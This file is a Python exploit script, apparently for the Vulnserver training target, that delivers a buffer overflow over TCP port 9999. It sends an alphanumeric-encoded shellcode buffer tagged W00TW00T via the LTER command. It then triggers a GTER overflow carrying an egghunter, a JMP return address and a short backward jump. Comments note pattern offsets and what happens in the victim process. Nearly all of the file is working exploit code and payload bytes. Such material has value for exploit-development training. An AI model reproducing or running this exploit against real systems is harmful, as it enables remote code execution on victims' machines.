#!/usr/bin/env python

# author: Win Sam
# description: Crash with 5014 bytes

import socket
import sys


#root@kali:~# /usr/bin/msf-pattern_offset -q 32624131
#[*] Exact match at offset 35
#root@kali:~# /usr/bin/msf-pattern_offset -q 62413062
#[*] Exact match at offset 31

crash=" "*99

#625011F9   FFE5                                   JMP EBP | return address
#62501203   FFE4                                   JMP ESP

egghunter="\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x57\x30\x30\x54\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
#W00T TAG
exploits="GTER "+crash+ egghunter+"\xcc"*(35-len(egghunter)+17) +"\x03\x12\x50\x62" + "\xeb\xae" + "A"*(100-35-4)



buf="LTER W00TW00T"
buf += "\x57\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
buf += "\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30"
buf += "\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42"
buf += "\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
buf += "\x79\x6c\x48\x68\x4c\x42\x37\x70\x35\x50\x53\x30\x55"
buf += "\x30\x4e\x69\x69\x75\x56\x51\x79\x50\x73\x54\x4e\x6b"
buf += "\x52\x70\x36\x50\x6e\x6b\x43\x62\x76\x6c\x6e\x6b\x72"
buf += "\x72\x34\x54\x4e\x6b\x71\x62\x51\x38\x64\x4f\x78\x37"
buf += "\x73\x7a\x34\x66\x36\x51\x4b\x4f\x4c\x6c\x55\x6c\x30"
buf += "\x61\x71\x6c\x66\x62\x66\x4c\x37\x50\x7a\x61\x68\x4f"
buf += "\x34\x4d\x53\x31\x68\x47\x49\x72\x5a\x52\x43\x62\x53"
buf += "\x67\x6c\x4b\x72\x72\x74\x50\x6c\x4b\x52\x6a\x77\x4c"
buf += "\x4c\x4b\x70\x4c\x66\x71\x43\x48\x48\x63\x31\x58\x75"
buf += "\x51\x5a\x71\x46\x31\x4e\x6b\x72\x79\x47\x50\x63\x31"
buf += "\x79\x43\x4e\x6b\x33\x79\x37\x68\x6d\x33\x76\x5a\x51"
buf += "\x59\x6e\x6b\x34\x74\x6e\x6b\x65\x51\x48\x56\x75\x61"
buf += "\x69\x6f\x6e\x4c\x59\x51\x48\x4f\x34\x4d\x46\x61\x5a"
buf += "\x67\x65\x68\x59\x70\x42\x55\x38\x76\x75\x53\x63\x4d"
buf += "\x4b\x48\x67\x4b\x63\x4d\x77\x54\x53\x45\x6b\x54\x66"
buf += "\x38\x6e\x6b\x66\x38\x56\x44\x55\x51\x78\x53\x42\x46"
buf += "\x4e\x6b\x36\x6c\x52\x6b\x6e\x6b\x51\x48\x75\x4c\x66"
buf += "\x61\x4b\x63\x6e\x6b\x64\x44\x4c\x4b\x63\x31\x68\x50"
buf += "\x4d\x59\x42\x64\x45\x74\x77\x54\x53\x6b\x63\x6b\x51"
buf += "\x71\x62\x79\x32\x7a\x63\x61\x69\x6f\x49\x70\x71\x4f"
buf += "\x73\x6f\x30\x5a\x4c\x4b\x67\x62\x68\x6b\x4e\x6d\x71"
buf += "\x4d\x71\x78\x46\x53\x76\x52\x63\x30\x33\x30\x70\x68"
buf += "\x32\x57\x51\x63\x64\x72\x53\x6f\x30\x54\x32\x48\x30"
buf += "\x4c\x70\x77\x51\x36\x74\x47\x79\x6f\x49\x45\x58\x38"
buf += "\x6c\x50\x67\x71\x57\x70\x65\x50\x64\x69\x38\x44\x32"
buf += "\x74\x72\x70\x72\x48\x77\x59\x6f\x70\x32\x4b\x47\x70"
buf += "\x79\x6f\x59\x45\x32\x70\x62\x70\x62\x70\x56\x30\x73"
buf += "\x70\x50\x50\x47\x30\x50\x50\x31\x78\x49\x7a\x64\x4f"
buf += "\x39\x4f\x4d\x30\x79\x6f\x7a\x75\x7a\x37\x72\x4a\x64"
buf += "\x45\x42\x48\x6f\x30\x6c\x68\x45\x36\x76\x75\x65\x38"
buf += "\x34\x42\x47\x70\x75\x45\x4d\x63\x6c\x49\x38\x66\x62"
buf += "\x4a\x46\x70\x46\x36\x62\x77\x31\x78\x4a\x39\x4d\x75"
buf += "\x32\x54\x51\x71\x39\x6f\x79\x45\x4d\x55\x4f\x30\x71"
buf += "\x64\x56\x6c\x39\x6f\x70\x4e\x57\x78\x53\x45\x48\x6c"
buf += "\x35\x38\x68\x70\x68\x35\x6f\x52\x70\x56\x59\x6f\x6e"
buf += "\x35\x62\x48\x53\x53\x50\x6d\x72\x44\x53\x30\x4d\x59"
buf += "\x6b\x53\x53\x67\x36\x37\x66\x37\x35\x61\x79\x66\x52"
buf += "\x4a\x55\x42\x71\x49\x53\x66\x59\x72\x59\x6d\x71\x76"
buf += "\x59\x57\x33\x74\x34\x64\x77\x4c\x46\x61\x77\x71\x6e"
buf += "\x6d\x32\x64\x51\x34\x46\x70\x38\x46\x55\x50\x57\x34"
buf += "\x61\x44\x30\x50\x76\x36\x32\x76\x46\x36\x62\x66\x42"
buf += "\x76\x42\x6e\x73\x66\x63\x66\x62\x73\x42\x76\x65\x38"
buf += "\x72\x59\x78\x4c\x75\x6f\x6e\x66\x39\x6f\x59\x45\x6f"
buf += "\x79\x4d\x30\x42\x6e\x72\x76\x51\x56\x49\x6f\x64\x70"
buf += "\x71\x78\x46\x68\x4c\x47\x65\x4d\x65\x30\x59\x6f\x4e"
buf += "\x35\x6d\x6b\x4c\x30\x4e\x55\x6e\x42\x51\x46\x42\x48"
buf += "\x59\x36\x4a\x35\x6f\x4d\x4d\x4d\x59\x6f\x49\x45\x65"
buf += "\x6c\x46\x66\x61\x6c\x65\x5a\x4b\x30\x69\x6b\x6d\x30"
buf += "\x53\x45\x76\x65\x4f\x4b\x77\x37\x62\x33\x61\x62\x50"
buf += "\x6f\x50\x6a\x33\x30\x73\x63\x39\x6f\x6e\x35\x41\x41"


exploit = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
exploit.connect(("192.168.102.152",9999))

print exploit.recv(1024)
exploit.send(buf)
##AT THIS POINT, VICTIM STORE THE PAYLOAD IN SOMEWHERE THE MEMORY ADDRESS
print exploit.recv(1024)
exploit.close()

exploit = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
exploit.connect(("192.168.102.152",9999))

print exploit.recv(1024)
print exploit.send(exploits)
##AT THIS POINT THE VICTIM PROGRAM CRASH AND EGGHUNTER LOOK FOR W00TW00T TAG AND JUMP TO THE SHELLCODE
print exploit.recv(1024)
exploit.close()
